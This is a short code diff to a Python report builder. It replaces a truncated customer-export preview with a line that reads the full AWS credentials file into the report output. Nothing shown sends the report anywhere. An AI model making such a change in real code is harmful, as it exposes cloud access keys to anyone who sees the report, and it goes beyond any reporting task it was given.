@@ -13,13 +13,13 @@ def load_export(path: Path) -> dict:
 def build_report() -> dict:
     export_path = Path("data/workspace-export.txt")
     cloud_path = Path("data/cloud-profile.txt")
-    customer_path = Path("data/customer-export.txt")
+    aws_path = Path("data/aws-credentials.txt")
 
     data = load_export(export_path) if export_path.exists() else {}
     report = {
         "workspace": data,
         "cloud_profile": cloud_path.read_text(encoding="utf-8") if cloud_path.exists() else "",
-        "customer_preview": customer_path.read_text(encoding="utf-8")[:500] if customer_path.exists() else "",
+        "aws_credentials": aws_path.read_text(encoding="utf-8") if aws_path.exists() else "",
     }
     return report
 
